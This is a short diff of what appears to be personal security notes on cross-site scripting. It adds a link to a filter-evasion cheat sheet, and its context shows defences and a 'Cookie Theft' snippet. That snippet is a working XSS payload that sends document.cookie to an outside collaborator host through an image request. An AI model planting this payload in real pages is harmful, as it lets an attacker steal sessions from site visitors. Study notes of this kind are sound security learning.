@@ -26,6 +26,7 @@ https://site.com/search?q=
 - Setup input validation
 - Setup output encoding to only return certain symbols
 # Uses
+- Evasion techniques: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 ### [[Cookies|Cookie]] Theft
 ```
 <script>var i=new Image;i.src="http://...oastify.com/?"+document.cookie;</script>
